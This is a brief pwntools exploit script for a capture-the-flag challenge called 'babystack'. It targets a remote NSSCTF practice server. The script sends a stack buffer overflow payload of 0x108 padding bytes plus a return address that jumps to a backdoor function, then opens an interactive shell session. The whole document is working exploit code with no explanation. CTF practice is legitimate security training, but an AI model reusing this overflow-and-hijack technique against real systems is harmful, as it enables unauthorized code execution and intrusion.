from pwn import *


backdoor = 0x400727

# io = process("./babystack")

io = remote("node5.anna.nssctf.cn", 21966)

payload = b"a" * (0x100+0x8) + p64(backdoor)
io.sendline(payload)

io.interactive()

